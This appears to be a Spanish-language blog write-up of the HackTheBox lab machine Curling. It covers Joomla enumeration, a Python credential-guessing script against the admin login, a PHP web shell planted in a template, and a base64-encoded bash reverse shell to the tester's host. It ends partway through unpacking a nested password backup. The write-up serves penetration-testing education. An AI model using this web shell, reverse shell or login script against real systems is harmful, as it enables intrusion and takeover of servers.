&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;puerto-80&quot;&gt;Puerto 80 &lt;a href=&quot;#puerto-80&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De primeras vemos 4 cosas interesantes:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;El t√≠tulo hace referencia a &lt;strong&gt;dos herramientas&lt;/strong&gt;: &lt;code&gt;cewl&lt;/code&gt; (para extraer el texto de una p√°gina web y convertirlo en un objeto de palabras (como un diccionario)) y &lt;code&gt;curl&lt;/code&gt; (para realizar peticiones web desde una consola).&lt;/li&gt;
  &lt;li&gt;Estamos ante el &lt;strong&gt;CMS (gestor de contenido)&lt;/strong&gt; &lt;code&gt;Joomla&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Y hay un &lt;strong&gt;login panel&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;p&gt;üåà &lt;strong&gt;&lt;em&gt;&lt;code&gt;Joomla&lt;/code&gt; como dijimos es un gestor de contenido que permite crear sitios web intuitivos, din√°micos e interactivos. Contiene as√≠ mismo un -panel administrativo- el cual sirve para modificar toooooodo el contenido que contenga la web.&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Si revisamos la interfaz web vemos mucho texto, esto junto a la referencia de &lt;code&gt;cewl&lt;/code&gt; nos podr√≠a indicar que debemos crear un diccionario de toooooooodas las palabras e intentar hacer un ataque de fuerza bruta contra el login. Pero claro, nos faltar√≠a saber el usuario con el que probar cada palabra‚Ä¶&lt;/p&gt;

&lt;p&gt;Leyendo por encima los anuncios nos damos cuenta de que hay dos referencias a posibles usuarios e incluso una cadena que podr√≠a ser una contrase√±a:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_readingHOME_possibleCREDS.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bien, ya tendr√≠amos 3 usuarios con los cuales podr√≠amos probar cada palabra de la web:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;Super User&lt;/code&gt; o &lt;code&gt;SuperUser&lt;/code&gt; o &lt;code&gt;superuser&lt;/code&gt; y distintas variantes.&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;Floris&lt;/code&gt; o &lt;code&gt;floris&lt;/code&gt; y variaciones.&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;pebble&lt;/code&gt; o &lt;code&gt;Pebble&lt;/code&gt;, etc.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Antes de eso veamos si existe alg√∫n recurso que el servidor est√© sirviendo, pero que no veamos a simple vista:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± dirsearch.py -w /opt/SecLists/Discovery/Web-Content/common.txt -u http://10.10.10.150/
...
Target: http://10.10.10.150/

[25:25:25] Starting: 
[25:25:25] 301 -  320B  - /administrator  -&amp;gt;  http://10.10.10.150/administrator/
[25:25:25] 301 -  310B  - /bin  -&amp;gt;  http://10.10.10.150/bin/
[25:25:25] 301 -  312B  - /cache  -&amp;gt;  http://10.10.10.150/cache/
[25:25:25] 301 -  317B  - /components  -&amp;gt;  http://10.10.10.150/components/
[25:25:25] 301 -  313B  - /images  -&amp;gt;  http://10.10.10.150/images/
[25:25:25] 301 -  315B  - /includes  -&amp;gt;  http://10.10.10.150/includes/
[25:25:25] 200 -   14KB - /index.php
[25:25:25] 301 -  315B  - /language  -&amp;gt;  http://10.10.10.150/language/
[25:25:25] 301 -  314B  - /layouts  -&amp;gt;  http://10.10.10.150/layouts/
[25:25:25] 301 -  316B  - /libraries  -&amp;gt;  http://10.10.10.150/libraries/
[25:25:25] 301 -  312B  - /media  -&amp;gt;  http://10.10.10.150/media/
[25:25:25] 301 -  314B  - /modules  -&amp;gt;  http://10.10.10.150/modules/
[25:25:25] 301 -  314B  - /plugins  -&amp;gt;  http://10.10.10.150/plugins/
[25:25:25] 403 -  300B  - /server-status
[25:25:25] 301 -  316B  - /templates  -&amp;gt;  http://10.10.10.150/templates/
[25:25:25] 301 -  310B  - /tmp  -&amp;gt;  http://10.10.10.150/tmp/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos varios recursos y la mayor√≠a son &lt;strong&gt;redirects&lt;/strong&gt;, pero redireccionan al mismo recurso‚Ä¶&lt;/p&gt;

&lt;p&gt;Todos son objetos que usa &lt;code&gt;Joomla&lt;/code&gt; en su ejecuci√≥n y funcionamiento, pero hay dos llamativos &lt;code&gt;administrator&lt;/code&gt; y &lt;code&gt;tmp&lt;/code&gt;. Revisando cada uno, simplemente &lt;strong&gt;administrator&lt;/strong&gt; nos devuelve algo:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_administrator.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Recuerdan que en la definici√≥n de &lt;strong&gt;Joomla&lt;/strong&gt; dijimos que existe un &lt;strong&gt;*panel administrativo&lt;/strong&gt; el cual sirve para modificar tooooooodo lo relacionado con el sitio web, pues es este (: Pero de nuevo estamos F, no hay credenciales para probar (adem√°s de las default, pero que no funcionan).&lt;/p&gt;

&lt;p&gt;Ya con nada m√°s a enumerar, ten√≠a puesto en mi mente el crear el script para jugar (pero no sab√≠a que me faltaba algo que siempre hago y que esta vez se me olvido (¬øya saben que puede ser?), genere la estructura del script, empece a armar las funciones y las dem√°s cositas. Llego el momento de ver si exist√≠an tokens o variables locas que viajaban entre el formulario, con lo cual era necesario ver la estructura (HTML) de la web.&lt;/p&gt;

&lt;p&gt;En este caso lo que veremos ahora lo encontr√© al ejecutar un script en &lt;code&gt;Python&lt;/code&gt; y viendo la respuesta de una petici√≥n web con el m√©todo &lt;code&gt;GET&lt;/code&gt; hacia el &lt;strong&gt;&lt;em&gt;home (&lt;code&gt;index.php&lt;/code&gt;)&lt;/em&gt;&lt;/strong&gt;, pero tambi√©n se puede ver simplemente inspeccionando el c√≥digo fuente &lt;code&gt;HTML&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-py&quot;&gt;...
import requests

URL = &quot;http://10.10.10.150&quot;

r = requests.get(URL)
print(r.text)
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;En su ejecuci√≥n la respuesta (&lt;code&gt;r.text&lt;/code&gt;) nos muestra algo curioso al final:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_scriptPY_rTEXThome_secretsTXT.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;VAYA VAYAAAAAAAAAAAaa lo que vemoooooooooooooos, hay un comentario que dice &lt;code&gt;secret.txt&lt;/code&gt;, o sea referencia un archivo &lt;code&gt;.txt&lt;/code&gt;, si intentamos buscarlo como recurso de la web, l o e n c o n t r a m o s:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_secretsTXT.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una cadena extra√±a, pero tiene tintes de estar encodeada en &lt;a href=&quot;https://es.wikipedia.org/wiki/Base64&quot;&gt;base64&lt;/a&gt;, valid√©moslo intentando decodificarla:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± echo &quot;Q3VybGluZzIwMTgh&quot; | base64 -d
Curling2018!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;OIEEEEEEEEEEEEEEeeeEeeee, eso s√≠ que parece una contrase√±a eh! Bastante feo, raro y mehh que este ese recurso ah√≠ en la web como si nada y con un comentario en el &lt;strong&gt;home&lt;/strong&gt; referenci√°ndola, pero bueno, sigamos‚Ä¶&lt;/p&gt;

&lt;p&gt;Ya tenemos dos cadenas que parecen contrase√±as:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;curling2018&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;Curling2018!&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Y tenemos los usuarios de antes, pues en vez de jugar con diccionarios probemos r√°pidamente cada usuario ‚Äúpotencial‚Äù con las dos contrase√±as:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-py&quot;&gt;#!/usr/bin/python3

import requests
import signal
import re

# Variables -----------------------.
URL = &quot;http://10.10.10.150/administrator/index.php&quot;

# Funciones -----------------------.
def def_handler(sig, frame):  # Ctrl+C
    print(&quot;\nsaLi3ndoo..\n&quot;)
    exit(0)

signal.signal(signal.SIGINT, def_handler)

def login(username, password):  # tryLogin
    # Generamos una nueva sesi√≥n para cada intento
    session = requests.Session()

    # Extraemos tokens de sesi√≥n
    r = session.get(URL)
    hidden_return_value = re.findall(r'&amp;lt;input type=&quot;hidden&quot; name=&quot;return&quot; value=&quot;(.*?)&quot;', r.text)[0]
    hidden_csrf_token_value = re.findall(r'&amp;lt;script type=&quot;application/json&quot; class=&quot;joomla-script-options new&quot;&amp;gt;{&quot;csrf.token&quot;:&quot;(.*?)&quot;', r.text)[0]

    data_post = {
        &quot;username&quot;: username,
        &quot;passwd&quot;: password,
        &quot;option&quot;: &quot;com_login&quot;,
        &quot;task&quot;: &quot;login&quot;,
        &quot;return&quot;: hidden_return_value,
        hidden_csrf_token_value: &quot;1&quot;
    }
    r = session.post(URL, data=data_post)

    if &quot;Username and password do not match or you do not have an account yet&quot; not in r.text:
        print(f&quot;Credenciales v√°lidas: {username}:{password}&quot;)
        exit(0)

def main():  # elCentrico
    array_users = [&quot;Super User&quot;, &quot;Floris&quot;, &quot;plebbe&quot;]
    array_passwords = [&quot;curling2018&quot;, &quot;Curling2018!&quot;]

    for username in array_users:
        for password in array_passwords:
            # Enviamos el usuario con algunas variantes, como MAYUSCULAS, minusculas, quitando espacios, etc.
            login(username.lower(), password)
            login(username.upper(), password)
            login(username.replace(' ',''), password)
            login(username.replace(' ','').lower(), password)
            login(username.replace(' ','').upper(), password)

    print(&quot;Ninguna credencial es v√°lida...&quot;)

# Inicio del programa -------------.
if __name__ == '__main__':
    main()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si lo ejecutamos, tenemoooooooooooooooooooooooos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_scriptPY_fuzzUsers_validCREDSjoomla.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;OPAAAAAAAAAAAAAAAAAAAAAAA, pues valid√©moslas en la web:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_administrator_LOGIN_DONEasFLORIS.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y SIII, tamos dentro (:&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;explotacion&quot;&gt;Explotaci√≥n &lt;a href=&quot;#explotacion&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;üî• &lt;a href=&quot;#joomla-template-rce-reverseshell&quot;&gt;Si ya sabes como conseguir &lt;strong&gt;RCE&lt;/strong&gt; modificando el template en &lt;strong&gt;Joomla&lt;/strong&gt; puedes evitar mi explicaci√≥n e ir directamente a como obtuvimos la &lt;strong&gt;Reverse Shell&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Ya dentro el conseguir una ejecuci√≥n remota de comandos es muy sencillo, sigamos un post que me gusta mucho:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.hackingarticles.in/joomla-reverse-shell/&quot;&gt;Joomla Reverse Shell&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Lo √∫nico que debemos hacer es modificar el contenido de un &lt;code&gt;template&lt;/code&gt;, existen varios objetos, modificamos uno de ellos con nuestro c√≥digo &lt;code&gt;PHP&lt;/code&gt; y ya la web lo interpretar√≠a (:&lt;/p&gt;

&lt;p&gt;Por ejemplo hagamos que la web ejecute el comando &lt;code&gt;whoami&lt;/code&gt; y que nos lo muestre:&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;joomla-template-rce&quot;&gt;Modificamos &lt;u&gt;template&lt;/u&gt; para conseguir &lt;u&gt;RCE&lt;/u&gt; &lt;a href=&quot;#joomla-template-rce&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Debemos seguir esta ruta de clics, primero &lt;code&gt;extensions&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_dashboard_extensions.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Despu√©s &lt;code&gt;templates&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_dashboard_extensions_templates.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos algo as√≠:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_dashboard_templates.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Damos clic en donde indica la flecha y llegamos a este apartado:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_dashboard_templates_list.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Seleccionamos cualquiera de los dos &lt;strong&gt;&lt;em&gt;templates&lt;/em&gt;&lt;/strong&gt;, yo usar√© &lt;code&gt;Beez3&lt;/code&gt;, damos clic en su nombre y ver√≠amos esto:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_dashboard_templateFILES_beez3.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Yo modificar√© el archivo &lt;code&gt;error.php&lt;/code&gt;, damos clic sobre √©l y empezamos a jugar‚Ä¶&lt;/p&gt;

&lt;p&gt;El contenido original no nos interesa, lo borramos (o guardamos en alg√∫n lado para despu√©s volverlo dejar como si no hubi√©ramos modificado nada ü§≠) y retomamos la idea de ejecutar &lt;code&gt;whoami&lt;/code&gt;, el archivo quedar√≠a as√≠:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php system(&quot;whoami&quot;); ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_dashboard_template_beez3_errorPHP_whoami.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.php.net/manual/es/function.system.php&quot;&gt;Manual PHP - system()&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;p&gt;Lo siguiente ser√° guardar el nuevo contenido del archivo &lt;code&gt;error.php&lt;/code&gt;, damos &lt;code&gt;Save&lt;/code&gt; y ver√≠amos este mensaje:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_dashboard_template_beez3_errorPHP_saved.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Perfecto, ahora solo debemos ver el contenido &lt;strong&gt;interpretado&lt;/strong&gt;, siguiendo esta ruta llegamos al objeto &lt;code&gt;error.php&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;http://10.10.10.150/templates/beez3/error.php
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yyyyy en la web ver√≠amos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_templateBEEZ3_errorPHP_whoamiRCE_done.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;OJOOOOOOOOOOOOOOOOOOOOOO, vemos que no hay errores y por el contrario se nos interpreta el contenido, nos indica que el usuario que ejecuta el servicio &lt;strong&gt;Joomla&lt;/strong&gt; es &lt;code&gt;www-data&lt;/code&gt;. AS√ç QUEEEEEE TEEEENEEEEEMOOOOOS ejecuci√≥n remota de comandos sobre el sistema (:&lt;/p&gt;

&lt;p&gt;Entabl√©monos una reverse Shell‚Ä¶&lt;/p&gt;

&lt;p&gt;Podemos indic√°rselo en el mismo &lt;code&gt;sy, pero A M√ç me gusta guardar una variable desde el m√©todo &lt;/code&gt;GET&lt;code&gt; que su contenido sea el que interprete la funci√≥n &lt;/code&gt;system()&lt;code&gt;, as√≠ no tenemos que estar modificando el contenido del template y solo jugamos con la variable &lt;/code&gt;xmd&lt;code&gt;, veamos un ejemplo r√°pido. Esta ser√≠a la estructura del archivo &lt;/code&gt;error.php`:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php system($_GET['xmd']); ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Donde la petici√≥n recibir√° una variable llamada &lt;code&gt;xmd&lt;/code&gt; que contendr√° nuestro comando y ese comando ser√≠a ejecutado por la funci√≥n &lt;code&gt;system()&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Guardamos y validamos el archivo en la web, ahora ejecutemos &lt;code&gt;hostname&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;http://10.10.10.150/templates/beez3/error.php?xmd=hostname
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yyyyy:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_templateBEEZ3_errorPHP_GETvarXMD_hostnameRCE_done.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;LISTOOOONES, ahora si hagamos una reverse Shell (:&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;joomla-template-rce-reverseshell&quot;&gt;Obtenemos &lt;u&gt;Shell&lt;/u&gt; en el sistema como &lt;u&gt;www-data&lt;/u&gt; &lt;a href=&quot;#joomla-template-rce-reverseshell&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Nos ponemos en escucha:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± nc -lvp 4433
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Generamos nuestro payload (lo que ejecutara el sistema) y lo encodeamos en &lt;strong&gt;base64&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± echo &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.5/4433 0&amp;gt;&amp;amp;1&quot; | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0MzMgMD4mMQo=
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez la petici√≥n sea recibida en nuestro puerto &lt;code&gt;4433&lt;/code&gt; se generar√° una &lt;code&gt;/bin/bash&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Ahora &lt;strong&gt;URLencodeamos&lt;/strong&gt; para evitar que &lt;code&gt;+&lt;/code&gt; o &lt;code&gt;=&lt;/code&gt; sean interpretados de manera err√≥nea por la web, usaremos &lt;a href=&quot;https://www.urlencoder.org/&quot;&gt;esta web&lt;/a&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160google_URLencode_revSH.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y lo que haremos para que el sistema entienda lo que le enviamos y lo interprete ser√°:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;http://10.10.10.150/templates/beez3/error.php?xmd=echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0MzMgMD4mMQo%3D | base64 -d | bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lanzamos la petici√≥n y en nuestro listeneeeeeeeeeeeeeer:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_wwwdataRevSH.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;TAMO DENTROOROROWOWOWOWOWOWOOWOW!!&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;He creado un script para automatizar la modificaci√≥n del template y obtener ejecuci√≥n remota de comandos desde √©l, se los dejo por si algo (con √©l no es necesario &lt;strong&gt;URLencodear&lt;/strong&gt; nada):&lt;/p&gt;

&lt;p&gt;üî¢ &lt;a href=&quot;https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/curling/joomlArce.py&quot;&gt;&lt;strong&gt;&lt;em&gt;joomlArce.py&lt;/em&gt;&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Antes de seguir hagamos un tratamiento de la &lt;strong&gt;TTY&lt;/strong&gt;, esto para que nuestra Shell sea completamente interactiva, nos permita ejecutar &lt;code&gt;Ctrl+C&lt;/code&gt;, tener hist√≥rico de comandos y movernos entre ellos.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://lanzt.gitbook.io/cheatsheet-pentest/tty&quot;&gt;https://lanzt.gitbook.io/cheatsheet-pentest/tty&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ahora si sigamos‚Ä¶&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;backupassword-floris&quot;&gt;backup_password: www-data -&amp;gt; floris &lt;a href=&quot;#backupassword-floris&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;Enumerando los directorios desde que obtenemos la reverse Shell hacia atr√°s vemos uno llamativo ¬ølo ves?:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_wwwdataSH_lsLA_configurationPHP.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Un objeto con nombre &lt;code&gt;configuration.php&lt;/code&gt; nos dice ‚Äúinvest√≠game‚Äù, as√≠ que hag√°mosle caso:&lt;/p&gt;

&lt;p&gt;(Es muy grande üòè)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_wwwdataSH_configurationPHP_creds.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Entre todo lo que hay detallamos dos contrase√±as, &lt;code&gt;$password&lt;/code&gt; y &lt;code&gt;$secret&lt;/code&gt;. Una de ellas es para el servicio &lt;code&gt;MySQL&lt;/code&gt; y el usuario &lt;code&gt;floris&lt;/code&gt;, si las probamos si nos permiten entrar al servicio &lt;code&gt;MySQL&lt;/code&gt;, pero no encontramos nada √∫til en √©l :( e intentando reutilizaci√≥n de contrase√±as tampoco obtenemos nada‚Ä¶&lt;/p&gt;

&lt;p&gt;Enumerando el sistema, encontramos un dos archivos llamativos en el &lt;code&gt;/home&lt;/code&gt; de &lt;strong&gt;floris&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_wwwdataSH_lsLA_home.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;El directorio &lt;code&gt;admin-area&lt;/code&gt;, pero no tenemos acceso a √©l a√∫n.&lt;/li&gt;
  &lt;li&gt;Por el contrario si tenemos acceso al objeto &lt;code&gt;password_backup&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;password-decompress&quot;&gt;Descomprimiendo el comprimido del comprimido &lt;a href=&quot;#password-decompress&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Veamos el backup‚Ä¶&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_wwwdataSH_catBackupPassword.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;El resultado de un dumpeo &lt;code&gt;hexadecimal&lt;/code&gt; contra un objeto, pero ¬øc√≥mo sabemos que es de un objeto?, bueno, investigando existe una herramienta con la que podemos (entre muuuchas cosas) -revertir- ese contenido &lt;strong&gt;hexadecimal&lt;/strong&gt; al original.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.tutorialspoint.com/unix_commands/xxd.htm&quot;&gt;xxd - Unix, Linux Command&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160google_xxd_revert.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pues intent√©moslo y guardemos el resultado en un archivo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@curling:/home/floris$ xxd -r password_backup &amp;gt; /tmp/file_reverse
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y si validamos el archivo resultante vemos el tipo de archivo original:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@curling:/tmp$ file file_reverse 
file_reverse: bzip2 compressed data, block size = 900k
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Un comprimido &lt;a href=&quot;https://es.wikipedia.org/wiki/Bzip2&quot;&gt;bzip2&lt;/a&gt;, pues d√©mosle el nombre de archivo necesario e intentemos descomprimirlo:&lt;/p&gt;

&lt;p&gt;(&lt;strong&gt;&lt;em&gt;Al ser poquitas veces las que debemos descomprimir el archivo, aprovecho para mostrarles el paso a paso&lt;/em&gt;&lt;/strong&gt;)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@curling:/tmp$ mv file_reverse file_reverse.bz2
www-data@curling:/tmp$ bzip2 -d file_reverse.bz2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y como resultado tenemos un nuevo objeto:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@curling:/tmp$ file file_reverse 
file_reverse: gzip compressed data, was &quot;password&quot;, last modified: Tue May 22 19:16:20 2018, from Unix
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora tenemos un objeto comprimido con &lt;a href=&quot;https://www.ochobitshacenunbyte.com/2019/09/19/comandos-gzip-y-gunzip-en-gnu-linux/&quot;&gt;gzip&lt;/a&gt;, descomprim√°moslo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@curling:/tmp$ mv file_reverse file_reverse.gz
www-data@curling:/tmp$ gzip -d file_reverse.gz
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y obtenemos un nuevo &lt;code&gt;bzip2&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@curling:/tmp$ file file_reverse 
file_reverse: bzip2 compressed data, block size = 900k
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Volvemos a descomprimirlo:&lt;/p&gt;

